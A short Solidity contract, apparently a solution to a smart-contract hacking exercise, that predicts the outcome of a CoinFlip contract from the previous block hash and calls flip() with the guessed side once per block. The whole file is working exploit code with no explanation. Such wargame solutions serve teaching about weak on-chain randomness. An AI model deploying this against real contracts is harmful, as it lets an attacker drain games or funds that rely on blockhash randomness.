//SPDX-License-Identifier:MIT

pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract AttackCoin{
    CoinFlip public coinflip;
    using SafeMath for uint256;
    uint256 lastHash = uint256(blockhash(block.number.sub(1)));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflipAddress) public{
        coinflip = CoinFlip(_coinflipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if(lastHash == blockValue){
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}